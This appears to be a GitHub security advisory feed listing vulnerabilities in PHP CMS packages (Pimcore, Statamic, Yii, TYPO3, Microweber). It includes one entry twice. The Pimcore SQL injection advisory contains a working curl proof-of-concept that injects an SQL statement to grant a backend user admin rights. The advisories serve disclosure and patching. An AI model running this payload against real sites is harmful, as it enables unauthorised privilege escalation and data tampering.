<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36806">https://nvd.nist.gov/vuln/detail/CVE-2023-36806</a></li>
<li><a href="https://github.com/contao/contao/commit/5c9aff32cfc1f7dc452a045862ac2f86a6b9b4b4">https://github.com/contao/contao/commit/5c9aff32cfc1f7dc452a045862ac2f86a6b9b4b4</a></li>
<li><a href="https://github.com/contao/contao/commit/c98585d36baa25fda69c062421e7e7eadc53c82b">https://github.com/contao/contao/commit/c98585d36baa25fda69c062421e7e7eadc53c82b</a></li>
<li><a href="https://github.com/contao/contao/commit/ccb64c777eb0f9c0e6490c9135d80e915d37cd32">https://github.com/contao/contao/commit/ccb64c777eb0f9c0e6490c9135d80e915d37cd32</a></li>
<li><a href="https://herolab.usd.de/security-advisories/usd-2023-0020/">https://herolab.usd.de/security-advisories/usd-2023-0020/</a></li>
<li><a href="https://github.com/advisories/GHSA-4gpr-p634-922x">https://github.com/advisories/GHSA-4gpr-p634-922x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4gpr-p634-922x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-25T17:19:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pimcore/pimcore] Pimcore SQL Injection in Admin Grid Filter API through Multiselect::getFilterConditionExt()]]></title>
        <id>https://github.com/advisories/GHSA-72hh-xf79-429p</id>
        <link href="https://github.com/advisories/GHSA-72hh-xf79-429p"/>
        <updated>2023-11-15T23:23:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>User input passed directly into an SQL statement allows (non-admin) backend users to execute arbitrary SQL statements.</p>
<h3 id="details">Details</h3>
<p>The <code>/admin/object/grid-proxy</code> endpoint calls <code>getFilterCondition()</code> on fields of classes to be filtered for at <a href="https://github.com/pimcore/admin-ui-classic-bundle/blob/bba7c7419cb1f06d5fd98781eab4d6995e4e5dca/src/Helper/GridHelperService.php#L311">https://github.com/pimcore/admin-ui-classic-bundle/blob/bba7c7419cb1f06d5fd98781eab4d6995e4e5dca/src/Helper/GridHelperService.php#L311</a>, passing input from the request, and later executes the returned SQL.
One implementation of <code>getFilterCondition()</code> is in <code>Multiselect</code>, which does not normalize/escape/validate the passed value: <a href="https://github.com/pimcore/pimcore/blob/42b6cfa77c4540205bdd10689893ccb73e4bac8f/models/DataObject/ClassDefinition/Data/Multiselect.php#L285-L312">https://github.com/pimcore/pimcore/blob/42b6cfa77c4540205bdd10689893ccb73e4bac8f/models/DataObject/ClassDefinition/Data/Multiselect.php#L285-L312</a></p>
<h3 id="poc">PoC</h3>
<ul>
<li>Set up an example project as described on <a href="https://pimcore.com/docs/platform/Pimcore/Getting_Started/Installation/Docker_Based_Installation">https://pimcore.com/docs/platform/Pimcore/Getting_Started/Installation/Docker_Based_Installation</a> (demo package with example content)</li>
<li>Enter the backend and add a new user without admin privileges, but the "Objects" permission enabled.</li>
<li>Log out and back in with the new user. Grab the <code>X-pimcore-csrf-token</code> header from any request the backend does, as well as the <code>PHPSESSID</code> cookie.</li>
<li>Run the following script, substituting the values accordingly:<pre><code class="language-bash">#!/bin/bash
BASE_URL=http://localhost:8084 # REPLACE THIS!
CSRF_TOKEN="bd89fd7ceb3b541dd63c200fd4fc8c8ea3cc1a05" # REPLACE THIS!
COOKIE="PHPSESSID=a0f408f9af7657430a4e6a1608c80277" # REPLACE THIS!
SQL="UPDATE users SET admin=1"

FILTER_JSON="[{\"property\":\"tags\",\"operator\":\"=\",\"type\":\"list\",\"value\":[\"')); ${SQL}; --\"]}]"

curl "${BASE_URL}/admin/object/grid-proxy?classId=EV&amp;folderId=1119" \
    -X POST \
    -H "X-pimcore-csrf-token: ${CSRF_TOKEN}" \
    -H "Cookie: ${COOKIE}" \
    --data "filter=$FILTER_JSON"
</code></pre>
</li>
<li>Refresh the backend, the user is admin now.</li>
</ul>
<p><strong>Notes</strong>
The above process also works with the initial admin user, but for demonstration purposes it is more interesting to use an unpriveleged one.
Other important variables to adjust in the above script for other deployments are the <code>classId=EV&amp;folderId=1119</code> parameters, which must reference an existing class and folder, as well as <code>"property":"tags"</code>, which points to a Multiselect field in this class.</p>
<h3 id="impact">Impact</h3>
<p>Any backend user with very basic permissions can execute arbitrary SQL statements and thus alter any data or escalate their privileges to at least admin level.</p>
<h3 id="patches">Patches</h3>
<p>Apply <a href="https://github.com/pimcore/pimcore/commit/d164d99c90f098d0ccd6b72929c48b727e2953a0.patch">patch</a> manually.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Update to version 11.1.1 or apply this <a href="https://github.com/pimcore/pimcore/commit/d164d99c90f098d0ccd6b72929c48b727e2953a0.patch">patch</a> manually.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pimcore/pimcore/security/advisories/GHSA-72hh-xf79-429p">https://github.com/pimcore/pimcore/security/advisories/GHSA-72hh-xf79-429p</a></li>
<li><a href="https://github.com/pimcore/pimcore/commit/d164d99c90f098d0ccd6b72929c48b727e2953a0">https://github.com/pimcore/pimcore/commit/d164d99c90f098d0ccd6b72929c48b727e2953a0</a></li>
<li><a href="https://github.com/pimcore/admin-ui-classic-bundle/blob/bba7c7419cb1f06d5fd98781eab4d6995e4e5dca/src/Helper/GridHelperService.php#L311">https://github.com/pimcore/admin-ui-classic-bundle/blob/bba7c7419cb1f06d5fd98781eab4d6995e4e5dca/src/Helper/GridHelperService.php#L311</a></li>
<li><a href="https://github.com/pimcore/pimcore/blob/42b6cfa77c4540205bdd10689893ccb73e4bac8f/models/DataObject/ClassDefinition/Data/Multiselect.php#L285-L312">https://github.com/pimcore/pimcore/blob/42b6cfa77c4540205bdd10689893ccb73e4bac8f/models/DataObject/ClassDefinition/Data/Multiselect.php#L285-L312</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47637">https://nvd.nist.gov/vuln/detail/CVE-2023-47637</a></li>
<li><a href="https://github.com/advisories/GHSA-72hh-xf79-429p">https://github.com/advisories/GHSA-72hh-xf79-429p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-72hh-xf79-429p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-15T14:53:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pimcore/admin-ui-classic-bundle] pimcore/admin-ui-classic-bundle Full Path Disclosure via re-export document]]></title>
        <id>https://github.com/advisories/GHSA-c8hj-w239-5gvf</id>
        <link href="https://github.com/advisories/GHSA-c8hj-w239-5gvf"/>
        <updated>2023-11-15T23:22:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Full Path Disclosure (FPD) vulnerabilities enable the attacker to see the path to the webroot/file. e.g.: /home/omg/htdocs/file/. Certain vulnerabilities, such as using the load_file() (within a SQL Injection) query to view the page source, require the attacker to have the full path to the file they wish to view.</p>
<p>In the case of pimcore, the fopen() function here doesn't have an error handle when the file doesn't exist on the server so the server response raises the full path "fopen(/var/www/html/var/tmp/export-{ uniqe id}.csv)"</p>
<h3 id="patches">Patches</h3>
<p>Apply patch <a href="https://github.com/pimcore/admin-ui-classic-bundle/commit/10d178ef771097604a256c1192b098af9ec57a87.patch">https://github.com/pimcore/admin-ui-classic-bundle/commit/10d178ef771097604a256c1192b098af9ec57a87.patch</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>Update to version 1.2.1 or apply <a href="https://github.com/pimcore/admin-ui-classic-bundle/commit/10d178ef771097604a256c1192b098af9ec57a87.patch">patches</a> manually</p>
<h3 id="references">References</h3>
<p><a href="https://huntr.com/bounties/4af4db18-9fd4-43e9-8bc6-c88aaf76839c/">https://huntr.com/bounties/4af4db18-9fd4-43e9-8bc6-c88aaf76839c/</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/pimcore/admin-ui-classic-bundle/security/advisories/GHSA-c8hj-w239-5gvf">https://github.com/pimcore/admin-ui-classic-bundle/security/advisories/GHSA-c8hj-w239-5gvf</a></li>
<li><a href="https://github.com/pimcore/admin-ui-classic-bundle/commit/10d178ef771097604a256c1192b098af9ec57a87">https://github.com/pimcore/admin-ui-classic-bundle/commit/10d178ef771097604a256c1192b098af9ec57a87</a></li>
<li><a href="https://huntr.com/bounties/4af4db18-9fd4-43e9-8bc6-c88aaf76839c/">https://huntr.com/bounties/4af4db18-9fd4-43e9-8bc6-c88aaf76839c/</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47636">https://nvd.nist.gov/vuln/detail/CVE-2023-47636</a></li>
<li><a href="https://github.com/advisories/GHSA-c8hj-w239-5gvf">https://github.com/advisories/GHSA-c8hj-w239-5gvf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c8hj-w239-5gvf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-15T14:49:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[microweber/microweber] Microweber Improper Access Control vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-q57g-38pc-jwv8</id>
        <link href="https://github.com/advisories/GHSA-q57g-38pc-jwv8"/>
        <updated>2023-11-14T22:26:22.000Z</updated>
        <content type="html"><![CDATA[<p>Improper Access Control in GitHub repository microweber/microweber prior to 2.0.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-5976">https://nvd.nist.gov/vuln/detail/CVE-2023-5976</a></li>
<li><a href="https://github.com/microweber/microweber/commit/bc537ebe235bf9924c6557a46114f5f9557cd16a">https://github.com/microweber/microweber/commit/bc537ebe235bf9924c6557a46114f5f9557cd16a</a></li>
<li><a href="https://huntr.com/bounties/2004e4a9-c5f6-406a-89b0-571f808882fa">https://huntr.com/bounties/2004e4a9-c5f6-406a-89b0-571f808882fa</a></li>
<li><a href="https://github.com/advisories/GHSA-q57g-38pc-jwv8">https://github.com/advisories/GHSA-q57g-38pc-jwv8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q57g-38pc-jwv8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-14T21:30:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[statamic/cms] Statamic CMS vulnerable to remote code execution via form uploads]]></title>
        <id>https://github.com/advisories/GHSA-2r53-9295-3m86</id>
        <link href="https://github.com/advisories/GHSA-2r53-9295-3m86"/>
        <updated>2023-11-15T18:08:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Similar to <a href="https://github.com/statamic/cms/security/advisories/GHSA-72hg-5wr5-rmfc">another advisory</a>, certain additional PHP files crafted to look like images may be uploaded regardless of mime type validation rules. This affects front-end forms using the "Forms" feature, and asset upload fields in the control panel.</p>
<h3 id="patches">Patches</h3>
<p>It has been patched in 3.4.14 and 4.34.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/statamic/cms/security/advisories/GHSA-2r53-9295-3m86">https://github.com/statamic/cms/security/advisories/GHSA-2r53-9295-3m86</a></li>
<li><a href="https://github.com/statamic/cms/pull/8991">https://github.com/statamic/cms/pull/8991</a></li>
<li><a href="https://github.com/statamic/cms/pull/8992">https://github.com/statamic/cms/pull/8992</a></li>
<li><a href="https://github.com/statamic/cms/commit/4c6fe041e2203a8033e5949ce4a5d9d6c0ad2411">https://github.com/statamic/cms/commit/4c6fe041e2203a8033e5949ce4a5d9d6c0ad2411</a></li>
<li><a href="https://github.com/statamic/cms/commit/da28afde818d605179fbb63b96eabafabad876b6">https://github.com/statamic/cms/commit/da28afde818d605179fbb63b96eabafabad876b6</a></li>
<li><a href="https://github.com/statamic/cms/releases/tag/v3.4.14">https://github.com/statamic/cms/releases/tag/v3.4.14</a></li>
<li><a href="https://github.com/statamic/cms/releases/tag/v4.34.0">https://github.com/statamic/cms/releases/tag/v4.34.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-48217">https://nvd.nist.gov/vuln/detail/CVE-2023-48217</a></li>
<li><a href="https://github.com/advisories/GHSA-2r53-9295-3m86">https://github.com/advisories/GHSA-2r53-9295-3m86</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2r53-9295-3m86</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-14T22:25:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[statamic/cms] Statamic CMS vulnerable to remote code execution via form uploads]]></title>
        <id>https://github.com/advisories/GHSA-2r53-9295-3m86</id>
        <link href="https://github.com/advisories/GHSA-2r53-9295-3m86"/>
        <updated>2023-11-15T18:08:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Similar to <a href="https://github.com/statamic/cms/security/advisories/GHSA-72hg-5wr5-rmfc">another advisory</a>, certain additional PHP files crafted to look like images may be uploaded regardless of mime type validation rules. This affects front-end forms using the "Forms" feature, and asset upload fields in the control panel.</p>
<h3 id="patches">Patches</h3>
<p>It has been patched in 3.4.14 and 4.34.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/statamic/cms/security/advisories/GHSA-2r53-9295-3m86">https://github.com/statamic/cms/security/advisories/GHSA-2r53-9295-3m86</a></li>
<li><a href="https://github.com/statamic/cms/pull/8991">https://github.com/statamic/cms/pull/8991</a></li>
<li><a href="https://github.com/statamic/cms/pull/8992">https://github.com/statamic/cms/pull/8992</a></li>
<li><a href="https://github.com/statamic/cms/commit/4c6fe041e2203a8033e5949ce4a5d9d6c0ad2411">https://github.com/statamic/cms/commit/4c6fe041e2203a8033e5949ce4a5d9d6c0ad2411</a></li>
<li><a href="https://github.com/statamic/cms/commit/da28afde818d605179fbb63b96eabafabad876b6">https://github.com/statamic/cms/commit/da28afde818d605179fbb63b96eabafabad876b6</a></li>
<li><a href="https://github.com/statamic/cms/releases/tag/v3.4.14">https://github.com/statamic/cms/releases/tag/v3.4.14</a></li>
<li><a href="https://github.com/statamic/cms/releases/tag/v4.34.0">https://github.com/statamic/cms/releases/tag/v4.34.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-48217">https://nvd.nist.gov/vuln/detail/CVE-2023-48217</a></li>
<li><a href="https://github.com/advisories/GHSA-2r53-9295-3m86">https://github.com/advisories/GHSA-2r53-9295-3m86</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2r53-9295-3m86</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-14T22:25:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[yiisoft/yii] yiisoft/yii deserializing untrusted user input can lead to remote code execution]]></title>
        <id>https://github.com/advisories/GHSA-mw2w-2hj2-fg8q</id>
        <link href="https://github.com/advisories/GHSA-mw2w-2hj2-fg8q"/>
        <updated>2023-11-14T22:19:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Affected versions of <code>yiisoft/yii</code> are vulnerable to Remote Code Execution (RCE) if the application calls <code>unserialize()</code> on arbitrary user input.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade <code>yiisoft/yii</code> to version 1.1.29 or higher.</p>
<h3 id="for-more-information">For more information</h3>
<p>See the following links for more details:</p>
<ul>
<li><a href="https://github.com/yiisoft/yii/commit/37142be4dc5831114a375392e86d6450d4951c06">Git commit</a></li>
<li><a href="https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection">https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection</a></li>
</ul>
<p>If you have any questions or comments about this advisory, <a href="https://www.yiiframework.com/security">contact us through security form</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/yiisoft/yii/security/advisories/GHSA-mw2w-2hj2-fg8q">https://github.com/yiisoft/yii/security/advisories/GHSA-mw2w-2hj2-fg8q</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47130">https://nvd.nist.gov/vuln/detail/CVE-2023-47130</a></li>
<li><a href="https://github.com/yiisoft/yii/commit/37142be4dc5831114a375392e86d6450d4951c06">https://github.com/yiisoft/yii/commit/37142be4dc5831114a375392e86d6450d4951c06</a></li>
<li><a href="https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection">https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection</a></li>
<li><a href="https://github.com/advisories/GHSA-mw2w-2hj2-fg8q">https://github.com/advisories/GHSA-mw2w-2hj2-fg8q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mw2w-2hj2-fg8q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-14T22:19:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[typo3/cms-install] Information Disclosure in typo3/cms-install tool]]></title>
        <id>https://github.com/advisories/GHSA-p2jh-95jg-2w55</id>
        <link href="https://github.com/advisories/GHSA-p2jh-95jg-2w55"/>
        <updated>2023-11-14T21:37:16.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<h3 id="cvss-cvss31avnachprnuinsuclinanefrlorcc-35">CVSS: <code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N/E:F/RL:O/RC:C</code> (3.5)</h3>
</blockquote>
<h3 id="problem">Problem</h3>
<p>The login screen of the standalone install tool discloses the full path of the transient data directory (e.g. <em>/var/www/html/var/transient/</em>). This applies to composer-based scenarios only - “classic” non-composer installations are not affected.</p>
<h3 id="solution">Solution</h3>
<p>Update to TYPO3 version 12.4.8 that fixes the problem described above.</p>
<h3 id="credits">Credits</h3>
<p>Thanks to Markus Klein who reported and fixed the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://typo3.org/security/advisory/typo3-core-sa-2023-005">TYPO3-CORE-SA-2023-005</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/TYPO3/typo3/security/advisories/GHSA-p2jh-95jg-2w55">https://github.com/TYPO3/typo3/security/advisories/GHSA-p2jh-95jg-2w55</a></li>
<li><a href="https://github.com/TYPO3/typo3/commit/1a735dac01ec7b337ed0d80c738caa8967dea423">https://github.com/TYPO3/typo3/commit/1a735dac01ec7b337ed0d80c738caa8967dea423</a></li>
<li><a href="https://typo3.org/security/advisory/typo3-core-sa-2023-005">https://typo3.org/security/advisory/typo3-core-sa-2023-005</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47126">https://nvd.nist.gov/vuln/detail/CVE-2023-47126</a></li>
<li><a href="https://github.com/advisories/GHSA-p2jh-95jg-2w55">https://github.com/advisories/GHSA-p2jh-95jg-2w55</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p2jh-95jg-2w55</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-11-14T20:34:26.000Z</published>
    </entry>
</feed>